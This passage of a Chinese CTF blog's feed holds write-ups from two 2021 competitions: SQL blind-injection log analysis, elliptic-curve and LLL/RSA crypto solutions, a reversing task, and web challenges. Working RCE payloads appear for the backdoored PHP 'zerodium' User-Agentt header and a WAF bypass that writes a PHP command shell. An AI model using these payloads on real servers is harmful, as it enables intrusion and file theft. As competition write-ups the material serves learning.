&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h2&gt;&lt;h3 id</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2021数字中国创新大赛虎符网络安全赛道</title>
    <link href="https://lazzzaro.github.io/2021/04/03/match-2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93/"/>
    <id>https://lazzzaro.github.io/2021/04/03/match-2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93/</id>
    <published>2021-04-03T12:31:00.000Z</published>
    <updated>2021-10-16T16:22:07.999Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>数字中国是十九大提出的新时代国家信息化发展的新战略。2021数字中国创新大赛，作为数字中国建设峰会“一会、一展、一赛”的重要组成部分， 将继续采取多赛道并行的竞赛形式，设置数字党建、数字政府、大数据、智慧医疗、鲲鹏计算、网络安全、集成电路设计、青少年AI机器人八个赛道，紧贴数字中国建设峰会主题，围绕核心前沿技术与信息技术应用创新设置赛题，以多维度立体化的角度诠释“数字中国”。</p><p>第二届“虎符网络安全赛道“将在去年首次将PK体系与传统网络安全竞赛相结合的优势基础上，继续保持Wintel+PK双体系并行模式进行比赛，以“PK体系”在网络安全赛事中的创新升级应用作为赛事的核心驱动。同时在此基础上进行包括赛事场景、评委阵容以及选手权益在内的三大升级。</p><p><a href="https://www.ichunqiu.com/2021hfctf">https://www.ichunqiu.com/2021hfctf</a></p><p>​    </p><p>rank: 80+</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="你会日志分析吗"><a href="#你会日志分析吗" class="headerlink" title="你会日志分析吗"></a>你会日志分析吗</h3><blockquote><p>线索只有一份access.log，你能从中分析到什么？</p></blockquote><p>明显能看出access.log日志文件中包含SQL时间盲注的记录，直接拉到最后看</p><p><code>?id=1&#39;%20and%20if(ord(substr((select%20flag%20from%20flllag),xx,1))=xx,sleep(2),1)</code>语句，</p><p>逐个字符猜解，正确情形会延迟2s，观察每行前一列的时间秒数，不连续的部分前一个字符即为正确字符。</p><p>懒写脚本，逐个手撸得到一串十进制数</p><p><code>90 109 120 104 90 51 116 90 98 51 86 102 89 88 74 108 88 51 78 118 88 50 100 121 90 87 70 48 102 81 61 61</code>，</p><p>转为字符为base64编码字符串<code>ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==</code>，解码即为flag。</p><p><strong>flag</strong></p><p><code>flag&#123;You_are_so_great&#125;</code></p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="cubic"><a href="#cubic" class="headerlink" title="cubic"></a>cubic</h3><blockquote><p>Please give me 6 pairs of positive integers (x,y,z) satisfying the equation <code>x/(y+z) + y/(z+x) + z/(x+y) = 6</code></p></blockquote><p>给出著名不定方程 $\cfrac{x}{y+z}+\cfrac{y}{x+z}+\cfrac{z}{x+y}=6$ 的6组<strong>正整数</strong>解，乍看容易实则不然。</p><p>方程在<strong>整数</strong>范围内易通过爆破求得多解，而<strong>正整数</strong>范围内很难用初等代数人工求得多解，需结合抽象代数解决。</p><p>背景参考：<a href="https://zhuanlan.zhihu.com/p/33853851">史上最贱的数学题</a></p><p>把 $x,y,z$ 看为 $a,b,c$，展开化简为：</p><p>$a^3+b^3+c^3-5(a^2b+ab^2+a^2c+ac^2+b^2c+bc^2)-9abc=0$</p><p>结合引用论文 <a href="http://publikacio.uni-eszterhazy.hu/2858/1/AMI_43_from29to41.pdf">An unusual cubic representation problem</a>，将方程映射到二维空间，即 $(a,b,c) \rightarrow (x,y)$。</p><p>$(a,b,c) \rightarrow (x,y)$ 映射关系式：</p><p>$\begin{cases} x=\cfrac{-4(a+b+2c)(N+3)}{(2a+2b-c)+(a+b)N}=\cfrac{-36(a+b+2c)}{8a+8b-c} \\ y=\cfrac{4(a-b)(N+3)(2N+5)}{(2a+2b-c)+(a+b)N}=\cfrac{612(a-b)}{8a+8b-c} \end{cases}$</p><p>取 $(a,b,c)=(1,-1,0)$，得到椭圆曲线的Weierstrass形式方程：</p><p>$E_6:y^2=x^3+(4N^2+12N-3)x^2+32(N+3)x=x^3+213x^2+288x$</p><p>在曲线上易取出基点 $G$ 作为初始点，根据不定方程的 $(ka,kb,kc)$ 通解特性，可分别将基点 $G$ 数乘得到 $2G,3G,\cdots$，再分别通过关系式映射回 $(a,b,c)$，以条件判断 $a&gt;0,b&gt;0,c&gt;0$，得到的 $(a,b,c)$ 即为不定方程的正整数解。</p><p>$(x,y) \rightarrow (a,b,c)$ 映射关系式：</p><p>$\begin{cases} \cfrac{a}{a+b+c}=\cfrac{8(N+3)-x+y}{2(4-x)(N+3)} \\ \cfrac{b}{a+b+c}=\cfrac{8(N+3)-x-y}{2(4-x)(N+3)} \\ \cfrac{c}{a+b+c}=\cfrac{-4(N+3)-(N+2)x}{(4-x)(N+3)} \end{cases}$</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">ee = EllipticCurve([<span class="number">0</span>, <span class="number">4</span>*<span class="number">6</span>^<span class="number">2</span>+<span class="number">12</span>*<span class="number">6</span>-<span class="number">3</span>, <span class="number">0</span>, <span class="number">32</span>*(<span class="number">6</span>+<span class="number">3</span>), <span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(ee)</span><br><span class="line"><span class="built_in">print</span>(ee.gens())</span><br><span class="line"></span><br><span class="line">P = ee(-<span class="number">200</span>,<span class="number">680</span>) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">orig</span>(<span class="params">P,N</span>):</span></span><br><span class="line">    x = P[<span class="number">0</span>]</span><br><span class="line">    y = P[<span class="number">1</span>]</span><br><span class="line">    a = (<span class="number">8</span>*(N+<span class="number">3</span>)-x+y)/(<span class="number">2</span>*(N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">    b = (<span class="number">8</span>*(N+<span class="number">3</span>)-x-y)/(<span class="number">2</span>*(N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">    c = (-<span class="number">4</span>*(N+<span class="number">3</span>)-(N+<span class="number">2</span>)*x)/((N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">    da = denominator(a)</span><br><span class="line">    db = denominator(b)</span><br><span class="line">    dc = denominator(c)</span><br><span class="line">    l = lcm(da,lcm(db,dc))</span><br><span class="line">    <span class="keyword">return</span> [a*l, b*l, c*l]</span><br><span class="line"></span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    u = orig(k*P, <span class="number">6</span>) </span><br><span class="line">    (a,b,c) = (u[<span class="number">0</span>],u[<span class="number">1</span>],u[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">if</span> a&gt;<span class="number">0</span> <span class="keyword">and</span> b&gt;<span class="number">0</span> <span class="keyword">and</span> c&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="built_in">print</span>(b)</span><br><span class="line">        <span class="built_in">print</span>(c)</span><br><span class="line">        <span class="built_in">print</span>(a/(b+c)+b/(a+c)+c/(a+b))</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        ans.append((a,b,c))</span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="comment">#len(ans)=8</span></span><br></pre></td></tr></table></figure><p>再通过pwntools与环境交互得flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;8.140.152.226&#x27;</span>,<span class="number">27359</span>)</span><br><span class="line">my = [...]</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] x: &#x27;</span>,<span class="built_in">str</span>(my[i][<span class="number">0</span>]))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] y: &#x27;</span>,<span class="built_in">str</span>(my[i][<span class="number">1</span>]))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] z: &#x27;</span>,<span class="built_in">str</span>(my[i][<span class="number">2</span>]))</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p><strong>flag</strong></p><p><code>flag&#123;1f88de74-b6af-4b2b-abd5-46356151698b&#125;</code></p><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="redemption-code"><a href="#redemption-code" class="headerlink" title="redemption_code"></a>redemption_code</h3><blockquote><p>所谓的虐心手游，连发的兑换码都这么复杂。</p></blockquote><p>反编译看<code>main()</code>函数，输入字符串<code>key</code>分别经过两次处理：</p><p><img src="/match-2021数字中国创新大赛虎符网络安全赛道/image-20210403212358981.png" alt="image-20210403212358981"></p><p>第一层处理，<code>pre()</code>函数：</p><p><img src="/match-2021数字中国创新大赛虎符网络安全赛道/image-20210403211907735.png" alt="image-20210403211907735"></p><p>先判断输入<code>key</code>长度<code>len(key)==14</code>，再与字符串<code>ss1=&quot;Ninja Must Die 3 Is A Cruel Game, So Hard For Me&quot;</code>共同作为<code>server_check_redemption_code()</code>函数参数：</p><p><img src="/match-2021数字中国创新大赛虎符网络安全赛道/image-20210403212645835.png" alt="image-20210403212645835"></p><p><code>server_check_redemption_code()</code>函数的核心部分，通过编写代码测试，功能为返回<code>key</code>中符合字符串<code>ss</code>子串的最大长度，<code>s</code>数组保存逐行判断得到的连续字符状态值，如整个<code>key</code>为<code>ss</code>子串，返回起始下标值<code>k-len(key)+1</code>，否则返回<code>-1</code>。</p><p>第二层处理，判断输入<code>key</code>长度<code>len(key)==14</code>，再与字符串<code>ss2=&quot;I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.&quot;</code>共同作为<code>server_check_redemption_code()</code>函数参数。</p><p>第一次check，需返回值不等于<code>-1</code>进到第二次check，第二次check需返回值为<code>7</code>输出flag，即<code>key</code>既是<code>ss1</code>子串，又是<code>ss2</code>从下标7开始的子串，即共有子串<code>Ninja Must Die</code>。</p><p><strong>flag</strong></p><p><code>flag&#123;Ninja Must Die&#125;</code></p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote><p>师傅们常说，要善于学习，细致入微；师傅们也常说，要善于分享，总结归纳。</p><p>hint: 2021年3月28日，PHP维护的官方Git服务器 git.php.net 被袭击，其Git仓库遭到恶意篡改。如果开发者使用这些遭到篡改的源代码进行网页的开发的话，网站就会在不知情的情况下被感染。</p></blockquote><p>开始在环境里翻了一圈无头绪，放hint后查找此事件才知道这是几天前的事，紧跟时事的出题人。</p><p>来龙去脉：</p><blockquote><p>3月28日，攻击者使用PHP的作者Rasmus Lerdorf和Jetbrains开发者Nikita Popov的账号，向git.php.net服务器上的 php-src 存储库推送了两次恶意提交。</p><p>经观察，在两个恶意提交中，攻击者在上游发布了一个假装成修正文字输入错误的神秘修改。</p><p>攻击者以Rasmus Lerdorf的身份签署的恶意提交（非法）植入远程代码执行后门。</p><p><img src="/match-2021数字中国创新大赛虎符网络安全赛道/e10b3802b2ea45628fc325c4c3cf3ad8.png" alt="img"></p><p>仔细检查一下新增的第370行调用<code>zend_eval_string</code>函数的地方，可以发现，这段代码实际上是为运行被劫持的PHP版本的网站植入了一个后门，以获得轻松的远程代码执行（RCE）。</p><p>PHP的开发者表示，如果字符串以<code>zerodium</code>开头，这一行就会从<code>User-Agentt</code> HTTP头内执行PHP代码。</p><p>此外，恶意代码中包含了一条注解 “REMOVETHIS: sold to zerodium, mid 2017”。值得注意的是，Zerodium是一家知名的零日漏洞经纪商，而注释的意思是“漏洞在2017年中出售给了zerodium”。对此，Zerodium的CEO Chaouki Bekrar认为攻击者很可能试图出售这个漏洞，但找不到卖家，所以攻击者干脆自己恶搞。</p></blockquote><p>同时参考Linkedin上的一文：<a href="https://www.linkedin.com/pulse/official-php-git-server-attacked-enrico-zimuel">Official PHP Git server attacked</a>，照样构造payload，开始没注意到属性是<code>User-Agentt</code>而不是默认的<code>User-Agent</code>，百试不出…</p><p>payload（加在HTTP头）</p><p>列目录：<code>User-Agentt: zerodiumsystem(&#39;ls /&#39;);</code></p><p>读文件：<code>User-Agentt: zerodiumsystem(&#39;cat /flag&#39;);</code></p><p><strong>flag</strong></p><p><code>flag&#123;cc5dbc99-fd75-41f8-87f6-825c7e08f016&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;数字中国是十九大提出的新时代国家信息化发展的新战略。2021数字中国创新大赛，作为数字中国建设峰会“一会、一展、一赛”的重要组成部分， 将继续采取多赛道并行的竞赛形式，设置数字党建、数字政府、大数据、智慧医疗、鲲鹏计算、网络安全、集成电路设计、青少</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>红明谷杯数据安全大赛技能场景赛</title>
    <link href="https://lazzzaro.github.io/2021/04/02/match-%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%8A%80%E8%83%BD%E5%9C%BA%E6%99%AF%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/04/02/match-%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%8A%80%E8%83%BD%E5%9C%BA%E6%99%AF%E8%B5%9B/</id>
    <published>2021-04-02T14:23:48.000Z</published>
    <updated>2021-04-02T15:07:15.488Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>位于福建省中西部的三明市是一座有着优良革命血脉及红色精神的土地，作为曾经的中央苏区的核心区、中央红军长征的出发地、红旗不倒的革命根据地、伟人革命的重要实践地，这片红土地在数字化的今天，在打击网络犯罪，维护数字空间秩序方面同样褒有红色的先进性。结合数字中国峰会，开创网络安全赛事红色品牌——“红明谷”杯，将“风展红旗如画”延伸至网络安全领域，与全国各界网络精英一同打造网络空间的红色安全保卫基地。</p><p>本届大赛将创新通过安全意识赛、技能场景赛、揭榜挑战赛等多种竞赛模式，综合考察社会公众、党政机关、行业单位、科研院校等社会各界的网络安全理论及实践应用水平，促进网络实战，建立红色防线，解决实际问题，立体化提升参赛各方网络空间数字治理能力。</p><p><a href="https://www.ichunqiu.com/hmgctf">https://www.ichunqiu.com/hmgctf</a></p><p>​    </p><p>报了名，因工作日没怎么参加，下午抽空做了两题。</p><p>Rank: 80+</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote><p>一起来参与数据安全知识小竞赛。</p></blockquote><p>答题拿flag。</p><p>​    </p><h3 id="歪比歪比"><a href="#歪比歪比" class="headerlink" title="歪比歪比"></a>歪比歪比</h3><blockquote><p>戴夫发送了一些信息给僵尸，但是被我截获到了。看看能从里边发现什么?好像是一个Surprise，你来翻译翻译?</p></blockquote><p>流量包里套着哈夫曼编码题，根据词频解码01串。</p><p>正要解出，到时间了。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ezCRT"><a href="#ezCRT" class="headerlink" title="ezCRT"></a>ezCRT</h3><blockquote><p>Chinese Remainder Theorem is fantastic</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;flag is here&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shuffle_flag</span>(<span class="params">s</span>):</span></span><br><span class="line">    str_list = <span class="built_in">list</span>(s)</span><br><span class="line">    shuffle(str_list)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(str_list)</span><br><span class="line"></span><br><span class="line">nl = []</span><br><span class="line">el = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count != <span class="number">5</span>:</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.next_prime(bytes_to_long(flag))</span><br><span class="line">    e = gmpy2.invert(d, phi)</span><br><span class="line">    nl.append(n)</span><br><span class="line">    el.append(<span class="built_in">int</span>(e))</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(nl)</span><br><span class="line"><span class="built_in">print</span>(el)</span><br><span class="line"></span><br><span class="line">cl = []</span><br><span class="line">flag = shuffle_flag(flag.decode()).encode()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nl)):</span><br><span class="line">    cl.append(<span class="built_in">pow</span>(bytes_to_long(flag), el[i], nl[i]))</span><br><span class="line"><span class="built_in">print</span>(cl)</span><br></pre></td></tr></table></figure></blockquote><p>五组 $n,e$，共私钥 $d$，用LLL算法打。发现 $n$ 都已帮从小到大排好序，一步到位。</p><p>由于 <code>d = gmpy2.next_prime(bytes_to_long(flag))</code>，求出 $d$ 后往回遍历拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">M=iroot(<span class="built_in">int</span>(n[<span class="number">4</span>]),<span class="built_in">int</span>(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">a = [<span class="number">0</span>]*<span class="number">6</span></span><br><span class="line">a[<span class="number">0</span>] = [M,e[<span class="number">0</span>],e[<span class="number">1</span>],e[<span class="number">2</span>],e[<span class="number">3</span>],e[<span class="number">4</span>]]</span><br><span class="line">a[<span class="number">1</span>] = [<span class="number">0</span>,-n[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">2</span>] = [<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">3</span>] = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">2</span>],<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">4</span>] = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">3</span>],<span class="number">0</span>]</span><br><span class="line">a[<span class="number">5</span>] = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">4</span>]]</span><br><span class="line"></span><br><span class="line">Mat = matrix(ZZ,a)</span><br><span class="line">Mat_LLL = Mat.LLL()</span><br><span class="line">d = <span class="built_in">abs</span>(Mat_LLL[<span class="number">0</span>][<span class="number">0</span>]) // M</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1500</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(d-k)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h3><blockquote><p>万无一失的waf。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = waf(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = check(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf(<span class="variable">$data</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>简单RCE。</p><p>先用 <code>?action=pwd</code> 得到所在目录，再用 <code>?action=upload&amp;data=xxx</code> 写PHP代码。</p><p><code>waf()</code>函数过滤了<code>php</code> 和 空格，用短标签和 <code>%09</code> 即可绕过。</p><p> <code>?action=upload&amp;data=&lt;?=`ls%09/`?&gt;</code> 读根目录，发现文件 <code>!whatyouwantggggggg401.php</code>，</p><p><code>?action=upload&amp;data=&lt;?=`tac%09/!whatyou*`?&gt;</code> 读文件，访问sandbox目录查看源码得到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;位于福建省中西部的三明市是一座有着优良革命血脉及红色精神的土地，作为曾经的中央苏区的核心区、中央红军长征的出发地、红旗不倒的革命根据地、伟人革命的重要实践地，这片红土地在数字化的今天，在打击网络犯罪，维护数字空间秩序方面同样褒有红色的先进性。结合数</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>静态反调试</title>
    <link href="https://lazzzaro.github.io/2021/02/24/reverse-%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    <id>https://lazzzaro.github.io/2021/02/24/reverse-%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95/</id>
    <published>2021-02-24T14:23:51.000Z</published>
    <updated>2021-02-24T14:48:12.271Z</updated>
    
